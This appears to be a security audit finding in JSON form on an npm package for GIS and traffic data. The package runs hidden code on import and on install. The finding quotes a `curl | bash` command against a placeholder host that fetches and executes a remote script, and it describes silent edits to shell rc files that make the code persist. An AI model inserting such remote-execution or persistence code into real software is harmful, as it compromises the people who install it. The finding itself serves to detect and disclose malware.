  "summary": "Import-time remote shell execution and silent shell-rc persistence",
  "details": "On import/require, src/index.js line 18 spawns a detached `bash -c 'curl -fsSL https://example.com/script.sh | bash'` with stdio:ignore, fetching and executing an unpinned remote shell script outside any consumer control. Separately, the package.json `postinstall` hook sources scripts/setup-env.sh, which uses `sed -i.bak` to silently insert a line into the user's `~/.zshrc`, `~/.bashrc`, or `~/.profile`, establishing persistence in the installer's login shell. Neither behavior is documented in the README and neither relates to the package's advertised GIS/traffic data normalization purpose. The detached + stdio:ignore pattern indicates intent to hide execution from the consumer.",
